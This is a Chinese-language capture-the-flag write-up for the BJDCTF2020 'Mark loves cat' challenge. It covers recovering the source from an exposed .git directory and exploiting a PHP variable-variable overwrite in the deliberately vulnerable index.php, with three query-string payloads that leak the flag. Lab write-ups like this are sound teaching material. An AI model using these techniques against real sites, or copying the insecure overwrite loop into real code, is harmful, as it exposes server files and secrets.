# [BJDCTF2020]Mark loves cat

## 知识点

`git泄露`

`php变量覆盖`

## 解题

题目首页

![](./img/[BJDCTF2020]Mark loves cat-1.png)

仅在源码里面找到了`dog`，尝试传参`cat=dog`之类的失败，`robots.txt`和`www.zip`没有，在尝试`/.git/HEAD`时发现有文件

`githack`下载源码

`flag.php`

```php
<?php

$flag = file_get_contents('/flag');
```

`index.php`

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
```

#### 1. handsome

`/?handsome=flag`
通过如下
`$handsome=$flag`
从而成功获取`flag`
为满足条件退出追加两个参数 `x=flag&flag=x`

```php
foreach($_GET as $x => $y){
    $$x = $$y; //GET型变量重新赋值为当前文件变量中以其值为键名的值
}
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){ //如果GET型中flag变量的值等于GET型中一个不为flag的键名则退出
        
        exit($handsome); //exit显然能利用
    }
}
```

#### 2. yds

比较简单 直接 `/?yds=flag`即可

```php
foreach($_GET as $x => $y){
    $$x = $$y; //GET型变量重新赋值为当前文件变量中以其值为键名的值
}
 //如果GET型和POST型中都没有变量flag,则退出
if(!isset($_GET['flag']) && !isset($_POST['flag'])){ 
    exit($yds);
}
```

#### 3. is

/?is=flag&flag=flag

```php
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
```

[参考文章](https://juejin.cn/post/7091558373337858079)